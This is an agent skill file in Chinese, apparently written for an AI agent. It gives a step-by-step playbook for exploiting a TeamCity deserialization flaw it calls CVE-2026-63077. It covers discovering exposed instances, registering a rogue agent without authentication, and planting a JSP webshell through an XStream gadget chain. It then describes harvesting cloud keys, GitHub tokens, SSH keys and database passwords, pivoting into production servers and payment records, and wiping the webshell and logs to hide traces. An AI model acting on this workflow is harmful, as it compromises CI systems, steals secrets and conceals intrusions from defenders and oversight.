---
name: 工城
description: >-
 大爱仙尊·Skill: TeamCity CVE-2026-63077 供应链接管
---

# TeamCity CVE-2026-63077 供应链接管

## 触发条件

：
- TeamCity、JetBrains CI、CI/CD 接管
- CVE-2026-63077、agent polling、XStream 反序列化
- 构建服务器、build server、CI 服务器凭据
- 供应链攻击、supply chain、CI/CD 密钥收割

---

## 执行流程

### 1. 先读 Playbook

```
传承/工城·开天.md
```

### 2. Scope 确认

目标 CI 域名必须在 `授权范围` 中，或与已授权主站同根域。

### 3. 发现阶段

```bash
# 从授权主域名发现 TeamCity 实例
python3 炼蛊房/teamcity_probe.py scan -d <授权域名>

# nuclei 快扫
nuclei -u <目标> -t tools/1day-kit/custom-templates/teamcity-unauth-rce-cve-2026-63077.yaml

# FOFA/Shodan 搜索（配合 tools/space-search）
# FOFA: title="TeamCity" && domain="目标域名"
```

### 4. 版本确认

```bash
python3 炼蛊房/teamcity_probe.py detect -u https://ci.目标.com
# 受影响：< 2025.11.7 / < 2026.1.3
```

### 5. 完整利用链

```bash
python3 炼蛊房/teamcity_probe.py exploit \
 -u https://ci.目标.com \
 --out 案卷/<案卷>/teamcity/
```

输出：
- `phase1_detect.json` — 版本信息
- `phase2_exploit.json` — 漏洞验证结果
- `gadget_chain_*.xml` — 反序列化 payload（手动发送）
- `SUMMARY.json` — 汇总

### 6. 凭据收割

```bash
# 有管理员 token 时
python3 炼蛊房/teamcity_probe.py harvest \
 -u https://ci.目标.com \
 --token <token>
```

**重点收割**：
- VCS token（GitHub/GitLab → 源码）
- 云 AK/SK（AWS/阿里云 → 云账号）
- SSH 私钥（→ 生产服务器）
- 数据库连接字符串

### 7. 供应链横向

| 拿到的凭据 | 下一步 |
|-----------|--------|
| GitHub token | `炼蛊房/js_secret_hunter.py` 扫所有仓库 |
| 阿里云 AK/SK | `炼蛊房/heap_cred_scan.py` + `tools/space-search` |
| SSH 私钥 | `tools/internal-tunnel` 进内网 |
| 数据库密码 | 直连数据库，找支付记录 |

### 8. 落证据

```
exports/<案卷>/teamcity/
├── phase1_detect.json
├── phase2_exploit.json
├── phase3_harvest.json
├── phase4_supply_chain.json
└── SUMMARY.json
```

更新 `STATUS.md`：
```markdown
## TeamCity CVE-2026-63077
- [ ] 发现实例
- [ ] 版本确认受影响
- [ ] agent 端点可达
- [ ] gadget chain 写 webshell
- [ ] 凭据收割
- [ ] 供应链横向
```

---

## 关键路径速查

```
暴露 TeamCity（< 2025.11.7）
 ↓
/app/agents/v1/register （无需认证注册 agent）
 ↓
/app/agents/v1/commands/error （XStream gadget chain）
 ↓
HSQLDB SCRIPT 写 JSP webshell
 ↓
webshell → 读 /opt/teamcity/data/config/ → 所有密钥
 ↓
云 AK/SK → GetCallerIdentity → RunCommand 到 EC2/ECS
GitHub token → 私有仓库源码 → 找更多密钥
SSH key → 生产服务器直连
```

---

## 注意事项

- gadget chain 写 webshell 依赖 TeamCity 进程对 webroot 有写权限（默认有）
- 如果 webroot 写不进去，尝试 `/tmp/`、`/var/lib/teamcity/` 等
- 生产环境横向（修改构建脚本/污染代码）属于**高影响操作**，先确认授权后再执行
- 清理痕迹：删除 webshell，恢复 teamcity-server.log 正常状态

## 真源

- 手法：`传承/工城·开天.md`
- 工具：`python3 炼蛊房/teamcity_probe.py --help`
